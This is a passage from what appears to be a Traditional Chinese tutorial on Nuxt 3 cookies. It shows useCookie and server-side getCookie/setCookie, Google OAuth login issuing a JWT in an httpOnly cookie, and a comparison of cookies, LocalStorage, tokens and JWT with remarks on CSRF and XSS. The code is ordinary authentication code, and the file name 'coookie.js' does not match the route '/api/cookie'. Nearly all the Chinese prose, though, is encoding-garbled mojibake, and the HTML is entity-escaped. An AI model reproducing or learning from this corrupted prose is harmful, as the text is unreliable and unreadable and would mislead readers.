\u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const name = useCookie(\u0026#39;name\u0026#39;) const counter = useCookie(\u0026#39;counter\u0026#39;, { maxAge: 60 }) const setNameCookie = () =\u0026gt; { name.value = \u0026#39;Ryan\u0026#39; } const setCounterCookie = () =\u0026gt; { counter.value = Math.round(Math.random() * 1000) } \u0026lt;/script\u0026gt; æˆ‘å€‘å°±å¯ä»¥è¨­ç½®ä¸€å€‹åªæœ‰ç›®å‰ç¶²é æœ‰æ•ˆçš„ cookie åç‚º name åŠä¸€å€‹éæœŸæ™‚é–“ç‚º 60 ç§’å¾Œçš„ counterã€‚\nä¼ºæœå™¨ç«¯ä½¿ç”¨ getCookie èˆ‡ setCookie ä½ å¯ä»¥åœ¨ä¼ºæœå™¨ç«¯ä½¿ç”¨ getCookie() ä¾†å–å¾—å‰ç«¯å¤¾å¸¶éä¾†çš„ cookieï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ setCookie ä¾†è¨­ç½® cookie å›æ‡‰çµ¦å‰ç«¯ã€‚\nèˆ‰å€‹ä¾‹å­ï¼Œæ–°å¢ server/api/coookie.jsï¼Œå…§å®¹å¦‚ä¸‹ï¼š\nserver/api/coookie.js 1 2 3 4 5 6 7 8 9 10 export default defineEventHandler((event) =\u0026gt; { let counter = getCookie(event, \u0026#39;counter\u0026#39;) counter = parseInt(counter, 10) || 0 counter += 1 setCookie(event, \u0026#39;counter\u0026#39;, counter) return { counter } }) ç•¶å‰ç«¯æ‰“ /api/cookie é€™éš» Server API æ™‚ï¼Œå°±æœƒè‡ªå‹•å¤¾å¸¶ç€è¦½å™¨ä¸­çš„ cookieï¼Œä¼ºæœå™¨ç«¯æ”¶åˆ°è«‹æ±‚è§£æ cookie å¾Œå¾—åˆ° counterï¼Œå°‡å…¶è½‰ç‚ºæ•¸å€¼æˆ–é è¨­ç‚º 0 å¾Œå¢åŠ  1ï¼Œå†é‡æ–°è¨­å®šå›å»çµ¦å‰ç«¯ã€‚\nä½¿ç”¨ Cookie åšä½¿ç”¨è€…é©—è­‰ æˆ‘å€‘å¯ä»¥å°‡ Cookie çš„é‹ä½œæ©Ÿåˆ¶æ‡‰ç”¨åœ¨æœƒå“¡ç³»çµ±ç•¶ä¸­ï¼Œä½¿ç”¨è€…ç™»å…¥æˆåŠŸå¾Œï¼Œå¾Œç«¯ç”¢ç”Ÿçš„ Token æˆ– Session å›å‚³ä¸¦å„²å­˜åœ¨ä½¿ç”¨è€…çš„ç€è¦½å™¨ä¸­ï¼Œä¹‹å¾Œçš„è«‹æ±‚å°‡æœƒè‡ªå‹•å¤¾å¸¶å¯ä»¥è¾¨è­˜å‡ºä½¿ç”¨è€…çš„ cookieï¼Œæˆ‘å€‘å°±å¯ä»¥åœ¨å¾Œç«¯è§£ææˆ–æ¯”å° cookie ä¾†é©—è­‰ä½¿ç”¨è€…çš„è³‡è¨Šï¼Œä¸¦ä¾ç…§ç­–ç•¥çµ¦äºˆä¸åŒçš„è™•ç†é‚è¼¯ã€‚\næˆ‘å€‘å»¶çºŒä¸Šè¿°çš„ä½¿ç”¨ Google OAuth ç™»å…¥ï¼Œæˆ‘å€‘å¯ä»¥åœ¨å¾Œç«¯å¯¦ä½œç”¢ç”Ÿæˆ‘å€‘è‡ªå·±ç³»çµ±ä½¿ç”¨çš„ Tokenï¼Œä¸¦è¨­ç½®åœ¨ access_token é€™å€‹ cookie ä¹‹ä¸­ï¼Œå¾Œç«¯å¯ä»¥å¯«å¦‚ä¸‹ç¨‹å¼ç¢¼ï¼Œä¾†è¨­ç½® httpOnly åŠ maxAge éæœŸæ™‚é–“ç­‰åƒæ•¸ã€‚\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 export default defineEventHandler(async (event) =\u0026gt; { // ... setCookie(event, \u0026#39;access_token\u0026#39;, accessToken, { httpOnly: true, maxAge, expires: new Date(expires * 1000), secure: process.env.NODE_ENV === \u0026#39;production\u0026#39;, path: \u0026#39;/\u0026#39; }) // ... }) æˆ‘å€‘ä½¿ç”¨ jsonwebtoken ç”¢ç”Ÿ JWTï¼Œè£¡é¢çš„ Payload æ”¾ç½®äº†ä½¿ç”¨è€…è³‡è¨Šï¼Œå…¶ä¸­ jwtSignSecret ä½œç‚ºæ ¸ç™¼ JWT çš„ç°½ç½²é‡‘é‘°ï¼Œæˆ‘å€‘å®šç¾©åœ¨ nuxt.config.ts ä¸­çš„ runtimeConfig.jwtSignSecretã€‚\nå®‰è£ jsonwebtoken\n1 2 3 npm install jsonwebtoken # or # yarn add jsonwebtoken å®Œæ•´çš„ ./server/api/auth/google.post.js ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nserver/api/auth/google.post.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import { OAuth2Client } from \u0026#39;google-auth-library\u0026#39; import jwt from \u0026#39;jsonwebtoken\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler(async (event) =\u0026gt; { const body = await readBody(event) const oauth2Client = new OAuth2Client() oauth2Client.setCredentials({ access_token: body.accessToken }) const userInfo = await oauth2Client .request({ url: \u0026#39;https://www.googleapis.com/oauth2/v3/userinfo\u0026#39; }) .then((response) =\u0026gt; response.data) .catch(() =\u0026gt; null) oauth2Client.revokeCredentials() if (!userInfo) { throw createError({ statusCode: 400, statusMessage: \u0026#39;Invalid token\u0026#39; }) } const jwtTokenPayload = { id: userInfo.sub, nickname: userInfo.name, email: userInfo.email } const maxAge = 60 * 60 * 24 * 7 const expires = Math.floor(Date.now() / 1000) + maxAge const jwtToken = jwt.sign( { exp: expires, data: jwtTokenPayload }, runtimeConfig.jwtSignSecret ) setCookie(event, \u0026#39;access_token\u0026#39;, jwtToken, { httpOnly: true, maxAge, expires: new Date(expires * 1000), secure: process.env.NODE_ENV === \u0026#39;production\u0026#39;, path: \u0026#39;/\u0026#39; }) return { id: userInfo.id, nickname: userInfo.name, avatar: userInfo.picture, email: userInfo.email } }) JWT åœ¨æ ¸ç™¼æ™‚ä½¿ç”¨çš„åŠ å¯†é‡‘é‘°ï¼Œå»ºè­°ä½¿ç”¨éå°ç¨±å¼çš„é‡‘é‘°é€²è¡ŒåŠ å¯†ï¼Œé€™é‚Šåƒ…æ˜¯ç‚ºäº†ç¯„ä¾‹å±•ç¤ºæ–¹ä¾¿è€Œä½¿ç”¨ç›¸åŒçš„ Secret é€²è¡ŒåŠ è§£å¯†ã€‚\næ¥è‘—ï¼Œæˆ‘å€‘å¯ä»¥å¯¦ä½œä¸€å€‹ Server APIï¼Œ./server/api/whoami.js ä¾†å¾ cookie å¾—åˆ° access_tokenï¼Œå†ç”¨ jwt.verify() æ–¹æ³•ï¼Œä¾†é©—è­‰ JTW å¾Œçš„åˆ°ä½¿ç”¨è€…è³‡è¨Šã€‚\nserver/api/whoami.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import jwt from \u0026#39;jsonwebtoken\u0026#39; const runtimeConfig = useRuntimeConfig() export default defineEventHandler((event) =\u0026gt; { const jwtToken = getCookie(event, \u0026#39;access_token\u0026#39;) try { const { data: userInfo } = jwt.verify(jwtToken, runtimeConfig.jwtSignSecret) return { id: userInfo.id, nickname: userInfo.nickname, email: userInfo.email } } catch (e) { throw createError({ statusCode: 401, statusMessage: \u0026#39;Unauthorized\u0026#39; }) } }) æˆ‘å€‘åœ¨å‰ç«¯ï¼Œå°±å¯ä»¥ä½¿ç”¨ /api/whoami é€™éš» API ä¾†å¾—åˆ°ä½¿ç”¨è€…çš„è³‡è¨Šå›‰ï¼\nä¸Šåœ–çš„æµç¨‹å¦‚ä¸‹ï¼š\nå‰å¾€ç™»å…¥é é¢ï¼Œä¸¦ä½¿ç”¨ Google é€²è¡Œç™»å…¥ ç™»å…¥æˆåŠŸå¾Œï¼Œæ‰“ /api/auth/google APIï¼ŒBody å¤¾å¸¶ Google OAuth å›å‚³çš„ access_tokenã€‚ /api/auth/google API å›å‚³å¾Œç«¯ç”¢ç”Ÿçš„æ™‚æ•ˆä¸ƒå¤©çš„ JWTï¼Œä¸¦è¨­ç½®æ–¼ cookie çš„ access_tokenï¼Œä¸¦å°‡å‰ç«¯é é¢å°èˆªè‡³ /whoami é é¢ã€‚ åœ¨ /whoami é é¢ï¼Œé»æ“Šã€Œæ‰“ /api/whoami APIã€æŒ‰éˆ•ï¼Œé€å‡º /api/whoami API è«‹æ±‚ï¼Œç€è¦½å™¨æœƒè‡ªå‹•å¤¾å¸¶ cookie è‡³å¾Œç«¯ã€‚ å¾Œç«¯ API /api/whoami æ”¶åˆ°è«‹æ±‚å¾Œï¼Œå¾ cookie ä¸­è§£æå‡º access_token çš„å€¼ï¼Œä¸¦é©—è­‰è§£æå‡º JWT å…§å«çš„ä½¿ç”¨è€…è³‡è¨Šï¼Œä¸¦å°‡å…¶å›å‚³è‡³å‰ç«¯æ¸²æŸ“ã€‚ pages/whoami.vue å®Œæ•´ç¨‹å¼ç¢¼ï¼š\npages/whoami.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center justify-center py-12 px-4 sm:px-6 lg:px-8\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;w-full max-w-md\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;mt-6 text-center text-3xl font-bold tracking-tight text-gray-700\u0026#34;\u0026gt;æˆ‘æ˜¯èª°\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-6 flex w-full max-w-md flex-col items-center\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;mt-2 w-fit rounded-sm bg-emerald-500 py-2 px-4 text-sm text-white hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;whoami\u0026#34; \u0026gt; æ‰“ /api/whoami API \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div v-if=\u0026#34;userInfo\u0026#34; class=\u0026#34;mt-8 flex w-full max-w-md flex-col\u0026#34;\u0026gt; \u0026lt;div v-for=\u0026#34;key in Object.keys(userInfo)\u0026#34; :key=\u0026#34;key\u0026#34; class=\u0026#34;mt-1 flex flex-wrap break-all\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-lg font-semibold text-emerald-500\u0026#34;\u0026gt; {{ key }}:\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-2 flex flex-1 text-lg text-slate-700\u0026#34;\u0026gt;{{ userInfo[key] }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const userInfo = ref() const whoami = () =\u0026gt; { useFetch(\u0026#39;/api/whoami\u0026#39;).then((response) =\u0026gt; { userInfo.value = response.data.value }) } \u0026lt;/script\u0026gt; è‡³æ­¤ï¼Œæˆ‘å€‘å°±å¯¦ä½œå‡ºä¸€å€‹ Google OAuth çš„ç™»å…¥åŠé©—è­‰æ©Ÿåˆ¶ï¼Œå¾ŒçºŒå¯ä»¥å†å°‡é€™äº›è³‡è¨Šå„²å­˜è‡³è³‡æ–™åº«ä¹‹ä¸­åšå¾ŒçºŒçš„ä½¿ç”¨ã€‚\né€™å€‹ç¯„ä¾‹çš„å®Œæ•´ç¨‹å¼ç¢¼å¯ä»¥åƒè€ƒ Nuxt 3 - ä½¿ç”¨ Cookie èˆ‡ JWT åšä½¿ç”¨è€…é©—è­‰\nå°æé†’ï¼Œå¦‚æœæ˜¯åœ¨ä¼ºæœå™¨ç«¯æ‰“ APIï¼Œå¯ä»¥ä½¿ç”¨ useRequestHeaders å°±å¯ä»¥å¾ä¼ºæœå™¨ç«¯è¨ªå•å’Œä»£ç† cookie åˆ° APIã€‚\n1 2 3 4 5 \u0026lt;script setup\u0026gt; const { data: userInfo } = await useFetch(\u0026#39;/api/whoami\u0026#39;, { headers: useRequestHeaders([\u0026#39;cookie\u0026#39;]) }) \u0026lt;/script\u0026gt; Cookieã€LocalStorageã€Token èˆ‡ JWT åœ¨åšä½¿ç”¨è€…é©—è­‰çš„æ™‚å€™ï¼ŒCookieã€LocalStorageã€Token èˆ‡ JWT æ˜¯å€‹é‡è¦çš„æ¦‚å¿µï¼Œé€™é‚Šç¨å¾®ç°¡è¿°ä¸€ä¸‹ä¹‹é–“çš„å·®ç•°èˆ‡ä½¿ç”¨æƒ…å¢ƒã€‚\nCookie é€šå¸¸æ¡ç”¨ Cookie ä¾†é©—è­‰ä½¿ç”¨è€…æ™‚ï¼Œç•¶ä½¿ç”¨è€…ç™»å…¥æˆåŠŸï¼Œæœƒç”±ä¼ºæœå™¨ç«¯ç”¢ç”Ÿä¸€çµ„ cookie ä¾†ç•¶ä½œå¾ŒçºŒé©—è­‰ä½¿ç”¨çš„ä¾æ“šï¼Œé€™å€‹ä¾æ“šæœƒæ˜¯ä¸€å€‹å­—ä¸²å½¢å¼ï¼Œç€è¦½å™¨æ¯æ¬¡ç™¼é€è«‹æ±‚æ™‚æœƒè‡ªå‹•å¤¾å¸¶ç¬¦åˆ Domainã€è·¯å¾‘è¨­å®šç­‰çš„ cookieï¼Œä¼ºæœå™¨ç«¯å°±å¯ä»¥ä¾æ“š cookie ä¾†è§£æé©—è­‰é€™å€‹å­—ä¸²æ‰€ä»£è¡¨çš„æ¶µæ„ï¼Œä¾‹å¦‚æ˜¯ä¸æ˜¯åŒ¹é…ä»£è¡¨æŸä½ä½¿ç”¨è€…å­—ä¸²ã€‚\nå¦‚åŒå‰é¢çš„ä¾‹å­ï¼Œæˆ‘å€‘å°‡ä¸€çµ„èƒ½å¤ ä»£è¡¨ Ryan çš„ JWT ç”±ç™»å…¥å¾Œç”¢ç”Ÿï¼Œä¸¦åœ¨å¾ŒçºŒè«‹æ±‚ä¸­å¤¾å¸¶ï¼Œä»¥é”åˆ°é©—è­‰ä½¿ç”¨è€…çš„æ•ˆæœã€‚\né€™ä¸²å­—ä¸²ï¼Œä¸ä¸€å®šæ˜¯è¦ JWTï¼Œåªè¦ä¼ºæœå™¨ç«¯èƒ½å›æ¨æˆ–å¾è³‡æ–™åº«æ¯”å°å‡ºæ‰€ä»£è¡¨çš„ä½¿ç”¨è€…æˆ–ç‰¹å®šè³‡è¨Šï¼Œé‚£éº¼ä¹Ÿå¯ä»¥æ˜¯éš¨æ„ç”¢ç”Ÿçš„å­—ä¸²ã€‚\nLocalStorage LocalStorage æ˜¯ç¾ä»Šç€è¦½å™¨åŸºæœ¬ä¸Šéƒ½æ”¯æ´çš„ä¸€å€‹å„²å­˜ç©ºé–“ï¼ŒåŒæ¨£å…·æœ‰ Domain çš„å¯«å…¥èˆ‡è®€å–çš„æ¦‚å¿µï¼Œåœ¨ cookie æˆ‘å€‘æœ€å¤šåªèƒ½å„²å­˜ 4KB å·¦å³çš„å­—ä¸²è³‡æ–™ï¼Œä½†æ˜¯åœ¨ LocalStorage é€šå¸¸æœ‰ 5MB æ‰€ä»¥èƒ½å¤ å„²å­˜æ›´å¤šçš„è³‡è¨Šã€‚\nä¹Ÿæœ‰ç¶²ç«™æœƒæŠŠé©—è­‰ä½¿ç”¨è€…çš„ Token æˆ–æ†‘è­‰ä¾æ“šå„²å­˜åœ¨ LocalStorageï¼Œä¹‹å¾Œç™¼é€è«‹æ±‚æˆ–éœ€è¦æ™‚å†å¾ä¸­æ‹¿å–å‡ºä¾†ä¸¦æ‰‹å‹•å¤¾å¸¶å‡ºå»ï¼ŒåŒæ¨£ä¹Ÿå¯ä»¥å¯¦ä½œå‡ºé©—è­‰ä½¿ç”¨è€…çš„æµç¨‹ã€‚\nåœ¨ç€è¦½å™¨çš„å„²å­˜ç©ºé–“ï¼Œé‚„æœ‰ä¸€å€‹ SessionStorageï¼Œå„²å­˜åœ¨é€™è£¡é¢çš„è³‡æ–™ï¼Œç•¶ç¶²é é—œé–‰æ™‚ï¼Œå°±æœƒè‡ªå‹•æ¸…é™¤ã€‚èˆ‡ LocalStorage ä¸åŒï¼Œé™¤éæ‰‹å‹•æˆ–ä½¿ç”¨ JS æ¸…é™¤ï¼Œä¸ç„¶è³‡æ–™æ°¸é å­˜åœ¨ï¼Œä¹Ÿä¸æœƒæœ‰éæœŸæ™‚é–“ã€‚\nToken ç”¨æ–¼æä¾›çµ¦ä½¿ç”¨è€…å¾ŒçºŒå¤¾å¸¶çµ¦å¾Œç«¯çš„æ†‘æ“šï¼Œç›¸ç•¶æ–¼ä¸€å€‹èº«åˆ†è­‰ï¼ŒToken é€šå¸¸ç”±å­—ä¸²çµ„æˆï¼Œä¸”éœ€è¦å¤ é•·ä¸å®¹æ˜“è¢«æš´åŠ›å˜—è©¦ç ´è§£ï¼ŒToken å­—ä¸²é€šå¸¸ä¸å…·æœ‰ä»»ä½•æ„ç¾©ï¼Œç›´è‡³å¾Œç«¯èˆ‡è³‡æ–™åº«æˆ–å…¶ä»–æ–¹å¼æ¯”å°å¾Œï¼Œæœƒå°æ‡‰å‡º Token æ‰€ä»£è¡¨çš„æ„ç¾©ï¼Œä¾‹å¦‚ä½¿ç”¨è€…è³‡è¨Šã€‚\né€šå¸¸è«‹æ±‚å¤¾å¸¶çš„ Tokenï¼Œéœ€è¦æ¯æ¬¡å¾€å¿«å–æˆ–è³‡æ–™åº«åšæ¯”å°ï¼Œæ‰èƒ½çŸ¥é“ Token æ‰€ä»£è¡¨çš„ä½¿ç”¨è€…ã€‚\nJWT(JSON Web Token) JWT æ˜¯ä¸€ç¨®é–‹æ”¾çš„æ¨™æº– RFC 7519ï¼Œå¦‚åŒåå­— JWT æ˜¯åŸºæ–¼ JSON Object æ‰€ç·¨ç¢¼å‡ºä¾†çš„ï¼ŒJWT æ˜¯ç”±ä¸‰å€‹éƒ¨åˆ† Headerã€Payload åŠ Signature çµ„åˆè€Œæˆã€‚\nå…¶ä¸­æœ€å¤§çš„ç‰¹è‰²å°±æ˜¯ Payload é€™å€‹éƒ¨åˆ†ï¼Œç•¶å¾Œç«¯ä¼ºæœå™¨æ”¶åˆ° JWT æ™‚ï¼Œå¯ä»¥å¾ Payload è§£æå‡ºç•¶åˆç°½ç™¼ JWT æ‰€åŒ…å«çš„è³‡è¨Šï¼Œé€šå¸¸æœƒåœ¨ Payload æ”¾ç½®ä½¿ç”¨è€…çš„ç›¸é—œè³‡æ–™ï¼Œå¦‚ Idã€å§“åæˆ–ä¿¡ç®±ç­‰ï¼Œå› ç‚ºé€™å€‹ç‰¹è‰²æˆ‘å€‘ä¸éœ€è¦å†æ¯”å°å¿«å–æˆ–è³‡æ–™åº«ï¼Œå°±å¯ä»¥ç›´æ¥è§£æå‡ºä½¿ç”¨è€…è³‡æ–™ã€‚\nè€Œ Payload é€™å€‹æ¬„ä½ï¼Œå› ç‚ºå¯ä»¥è¢«è§£ç¢¼å‡ºä¾†ï¼Œå†ä»»æ„çš„ä¿®æ”¹å¾Œé‡æ–°ç·¨ç¢¼ï¼Œæ‰€ä»¥æˆ‘å€‘å°±æœƒå€ŸåŠ© Header åŠ Signature é€™å…©å€‹éƒ¨åˆ†ï¼Œä¾†ç¢ºèªç•¶åˆåŠ å¯†çš„æ¼”ç®—æ³•åŠé©—è­‰ç°½ç« æ˜¯å¦ç¬¦åˆï¼Œä»¥é˜²æ­¢ Payload è¢«ä»»æ„çš„ç«„æ”¹ã€‚\nToken æˆ– JWT é¸å“ªä¸€å€‹ï¼Ÿ é€™å…©è€…ä¹‹é–“å„æœ‰å„ªç¼ºé»ï¼Œé›–ç„¶è‡ªç”¢ Token éœ€è¦æ¯æ¬¡æ¯”å°è³‡æ–™åº«ï¼Œä½†æ˜¯èƒ½æœ‰æ•ˆçš„è¨˜éŒ„ä½¿ç”¨è€… Token æ ¸ç™¼ä½¿ç”¨çš„ä½ç½®åŠè¨»éŠ·ç‰¹å®šçš„ Tokenï¼Œå› ç‚º JWT åœ¨ç°½ç™¼å¾Œï¼Œä¸€å®šå¾—ç­‰åˆ°éæœŸæ‰æœƒå¤±æ•ˆç„¡æ³•ä½¿ç”¨ï¼Œä¹Ÿå°±å°è‡´ JWT åœ¨æ ¸ç™¼ä¹‹å¾Œæ˜¯ç„¡æ³•è¨»éŠ·çš„ï¼Œé™¤éè‡ªå·±åœ¨å¯¦ä½œä¸€å€‹é»‘åå–®æˆ–ç™½åå–®çš„æ©Ÿåˆ¶ã€‚\nå¯ä»¥ä¾æ“šä½¿ç”¨çš„æƒ…å¢ƒä¾†æ±ºå®š Token æˆ– JWTï¼Œåªè¦è¨˜å¾—ä½¿ç”¨ Token ä½œç‚ºè§£æ±ºæ–¹æ¡ˆï¼Œè¦ä¿è­‰ Token è¶³å¤ è¤‡é›œæˆ–éš¨æ©Ÿï¼Œä¸å®¹æ˜“è¢«æ¨æ¸¬æˆ–æš´åŠ›å˜—è©¦ï¼Œå¦‚æœçœŸçš„è¦ä½¿ç”¨æ¯”è¼ƒçŸ­çš„ Token ä¹Ÿç¢ºä¿éæœŸçš„æ™‚é–“ä¸è¦è¨­å®šå¤ªé•·ï¼Œè¦é »ç¹çš„æ›´æ›é€™çµ„ Token æˆ–æ·»åŠ å…¶ä»–é©—è­‰æ©Ÿåˆ¶ã€‚\nè€Œ JWT çš„åˆ©æ–¼å¯ä»¥åŒ…å« Payloadï¼Œä¹Ÿåˆ‡è¨˜åœ¨å¾Œç«¯æ ¸ç™¼æ™‚ä¸è¦å°‡æ•æ„Ÿè³‡æ–™æˆ–å¯†é‘°å¤¾å¸¶åœ¨ Payload ä¹‹ä¸­ï¼Œå› ç‚º JWT çš„ Payload å°±ç®—ä¸çŸ¥é“åŠ å¯†çš„ç§é‘°é‚„æ˜¯å¯ä»¥è¢«è§£ç¢¼çš„ã€‚è€Œç°½ç™¼ JWT é¸æ“‡åŠ å¯†çš„æ–¹å¼ä¹Ÿç›¡é‡æ¡ç”¨éå°ç¨±å¼çš„å®¶å§å¯†ï¼Œä¾‹å¦‚ä½¿ç”¨ ES256 (ECDSA-SHA256) æ¼”ç®—æ³•ç”¢ç”Ÿçš„éå°ç¨±é‡‘é‘°ä¾†é€²è¡ŒåŠ å¯†ã€‚\nToken è¦æ”¾åœ¨ Cookie é‚„æ˜¯ LocalStorageï¼Ÿ å¾Œç«¯ç”¢ç”Ÿçš„ Token æˆ– JWTï¼Œä¸ç®¡å­˜æ”¾åœ¨ Cookie æˆ– LocalStorage åªè¦æ³¨æ„å…¶ç‰¹æ€§åŠå®‰å…¨ï¼Œé‚£éº¼æƒ³å­˜åœ¨å“ªè£¡ï¼Œéƒ½æ˜¯å¯ä»¥è¢«æ¥å—çš„ã€‚\næ”¾åœ¨ Cookie å°‡ Token å­˜æ”¾åœ¨ Cookie çš„å¥½è™•ï¼Œå¯ä»¥ç”¨ä¾†æ§åˆ¶ç¶²ç«™çš„ Domain æˆ– SubDomain é€²è¡Œå­˜å–ï¼Œä¹Ÿå¯ä»¥è¨­å®šéæœŸæ™‚é–“ä¾†æ§åˆ¶å‰ç«¯æ˜¯å¦è¦é‡æ–°å•å¾Œç«¯ç”¢ç”Ÿæ–°çš„ Tokenï¼Œæœ€å¤§çš„ç‰¹é»å°±æ˜¯è‡ªå‹•å¤¾å¸¶åœ¨æ¯å€‹è«‹æ±‚ç•¶ä¸­ï¼Œä¹Ÿå› ç‚ºé€™é …ç‰¹æ€§ï¼Œæœ‰ä¸€äº›è³‡å®‰é¢¨éšªå°±éœ€è¦ç¨å¾®æ³¨æ„ä¸€ä¸‹ã€‚\nè·¨ç«™è«‹æ±‚å½é€  (Cross Site Request Forgery, CSRF) å°±æ˜¯ä¸€å€‹ cookie ä½¿ç”¨æ™‚æ‰€éœ€è¦æ³¨æ„çš„è³‡å®‰å•é¡Œï¼Œæ‰€ä»¥ç•¶ä½¿ç”¨ cookie ä½œç‚ºé©—è­‰æ©Ÿåˆ¶æ™‚ï¼Œå»ºè­°åœ¨æ•æ„Ÿçš„æ“ä½œä¸Šå¤šæ·»åŠ é©—è­‰çš„æ©Ÿåˆ¶ï¼Œæˆ–ä½¿ç”¨ CSRF Token ä¾†ä¿è­·ä½ çš„ cookie ä¸è¢«éš¨æ„å½é€ è«‹æ±‚çš„å¤¾å¸¶å‡ºå»ã€‚\nå°‡ Token æˆ–æ•æ„Ÿè³‡æ–™å„²å­˜åœ¨ cooike æ™‚ï¼Œé‚„æ˜¯å¯ä»¥é€é JavaScript çš„ document.cookie åšå­˜å–ï¼Œæ‰€ä»¥å¦‚æœç¶²ç«™æœ‰å­˜åœ¨è·¨ç¶²ç«™æŒ‡ä»¤ç¢¼ (Cross-site scripting, XSS) çš„å¼±é»ï¼Œä½ çš„ cookie å¾ˆå¯èƒ½å°±æœƒç›´æ¥è¢«å·èµ°ï¼Œç‚ºäº†é˜²æ­¢ XSS å¼±é»å°è‡´ cookie å¤–æ´©ï¼Œä½ å¯ä»¥å°‡ cookie è¨­å€¼æ™‚çš„å±¬æ€§ httpOnly è¨­ç½®ç‚º trueï¼Œè®“å®¢æˆ¶ç«¯ç€è¦½å™¨ç„¡æ³•ç›´æ¥å­˜å–ï¼Œåƒ…æœ‰åœ¨ç™¼é€è«‹æ±‚æ™‚ï¼Œç”±ç€è¦½å™¨è‡ªå‹•å¤¾å¸¶è‡³å¾Œç«¯ï¼Œæ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¨­ç½® secure è®“ cookie åªåœ¨ HTTPS ä¸‹å‚³è¼¸ã€‚\næ”¾åœ¨ LocalStorage é—œæ–¼ Token æ˜¯å¦å„²å­˜åœ¨ LocalStorage å…¶å¯¦æœ‰ä¸åŒçš„çœ‹æ³•ï¼Œå› ç‚º cookie å­˜åœ¨è‘— CSRF æˆ– XSS ç­‰å•é¡Œéœ€è¦è§£æ±ºï¼Œè€Œå­˜æ”¾åœ¨ LocalStorage ä¸åƒ…æœ‰æ›´å¤§çš„ç©ºé–“ï¼Œé‚„ä¸è‡ªå¸¶å…ç–« CSRFï¼Œé›£é“ä¸é¦™å—ï¼Ÿ\nä½†æ˜¯åˆ¥å¿˜äº† LocalStorage ä¹Ÿæ˜¯é€é JS ä¾†åšå„²å­˜èˆ‡è®€å–ï¼Œæ‰€ä»¥å°±ç®—ä½¿ç”¨ LocalStorage äº†ï¼Œä½† XSS å¼±é»å¦‚æœå­˜åœ¨ï¼Œä½ çš„ Token ä¸€æ¨£æœ‰å¤–æ´©çš„å¯èƒ½æ€§ã€‚\nè€Œä¸” LocalStorage ä¸å…·æœ‰éæœŸè‡ªå‹•åˆªé™¤çš„ç‰¹æ€§ï¼Œé™¤éè‡ªå·±å¯¦ä½œæˆ–åˆªé™¤å¦å‰‡å°‡æ°¸é çš„å­˜åœ¨ç€è¦½å™¨ä¹‹ä¸­ã€‚\næ‰€ä»¥ï¼Ÿ\nç¶²è·¯ä¸Šæœ‰è¨±å¤šä½¿ç”¨ Cookie æˆ– LocalStorage å„²å­˜ Token èªªæ³•ï¼Œæœ‰èˆˆè¶£ä¹Ÿå¯ä»¥çœ‹çœ‹å…©æ´¾å„è‡ªè«–è¿°çš„å„ªç¼ºé»ï¼Œæ‰€ä»¥ï¼Œä¸ç®¡æ˜¯ Cookie é‚„æ˜¯ LocalStorage æ²’æœ‰èªªä¸€å®šä¸èƒ½ä½¿ç”¨èª°ï¼Œè€Œæ˜¯è¦ä¾æ“šç‰¹æ€§åŠæƒ…å¢ƒä¾†åšä½¿ç”¨ï¼Œä¸¦åšå¥½å®šæœŸé‡æ–°ç”¢ç”ŸåŠç›¸é—œçš„å®‰å…¨é…ç½®ã€‚\næˆ‘è‡ªå·±å¤§æ¦‚æœƒä¾ç…§é€™å€‹ç¶²ç«™æˆ–æœå‹™ï¼Œæ˜¯ç›¸å°ç°¡å–®ä¹Ÿæ¯”è¼ƒä¸æœƒæœ‰æœƒé€ æˆæ‚²åŠ‡çš„æ“ä½œæˆ–å…§å®¹ç®¡ç†ç‚ºä¸»çš„æœå‹™ï¼Œæˆ‘å¯èƒ½å°±æœƒæ¡ç”¨ cookie çš„æ–¹æ¡ˆè™•ç†é©—è­‰ï¼Œå› ç‚ºç›¸å°ä¾†èªªè‡ªå‹•å¤¾å¸¶èˆ‡æœ‰æ•ˆæœŸé™åŠ httpOnly ä¾†æ§åˆ¶å®¢æˆ¶ç«¯æ˜¯å¦èƒ½ç›´æ¥å­˜å–ï¼Œå°æˆ‘ä¾†èªªé‚„æ˜¯æŒºæ–¹ä¾¿èˆ‡å®‰å…¨çš„ï¼Œå¯èƒ½åœ¨é©ç•¶çš„æ™‚æ©Ÿå†æ·»åŠ  CSRF Token æˆ–å¤šé“é©—è­‰æ©Ÿåˆ¶ï¼Œå°±èƒ½å®‰å…¨çš„ä½¿ç”¨ cookieã€‚\nè€Œåœ¨å¤šç‚ºå…§éƒ¨ç³»çµ±ä½¿ç”¨æˆ–æ˜¯ API åœ¨ Mobile App ç”šè‡³æ˜¯ä¸æ”¯æ´ Cookie ç’°å¢ƒä¹‹ä¸‹éœ€è¦ä½¿ç”¨ Token ä¾†é©—è­‰ï¼Œæˆ‘å°±æœƒæ¡ç´å°‡ Token å„²å­˜åœ¨ LocalStorageã€‚\næœå°‹å¼•æ“æœ€ä½³åŒ– (SEO) èˆ‡ 